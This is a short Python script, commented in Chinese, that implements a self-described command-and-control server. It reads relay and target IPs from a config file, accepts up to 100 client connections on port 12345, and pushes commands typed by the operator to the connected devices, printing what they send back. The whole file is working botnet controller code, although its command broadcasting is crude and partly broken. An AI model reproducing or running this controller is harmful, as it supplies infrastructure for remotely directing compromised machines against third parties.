import socket
import threading
import json
# 共享的資源，用於存儲指令
command_to_clients = ""

def handle_client(client_socket):
    global command_to_clients

    while True:
        # 收到指令後，將指令發送給所有Client
        if command_to_clients:
            client_socket.send(command_to_clients.encode())
            response = client_socket.recv(1024).decode()
            print("Response from Client:", response)
            # 清空指令，表示已經處理
            command_to_clients = ""

def read_config_ip():
    filename = 'ip_config.ini'
    with open(filename, 'r') as file:
        json_data = json.load(file)
    RelayIP = json_data['RelayIP']
    targetIP = json_data['targetIP']
    return RelayIP, targetIP

def start_server():
    Host_IP, targerIP = read_config_ip() #target IP not use
    host = Host_IP
    port = 12345

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(100)

    print("C&C Server is listening on {}:{}".format(host, port))

    while True:
        client_socket, client_address = server_socket.accept()
        print("Connection from: {}".format(client_address))

        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

    server_socket.close()

def send_command_to_clients():
    global command_to_clients
    while True:
        # Server輸入指令
        command = input("Enter something command to device ")
        if command == "exit":
            break
        else:
            command_to_clients = command

if __name__ == "__main__":

    client_thread = threading.Thread(target=start_server)
    command_thread = threading.Thread(target=send_command_to_clients)

    client_thread.start()
    command_thread.start()

    client_thread.join()
    command_thread.join()

    print("C&C Server stopped.")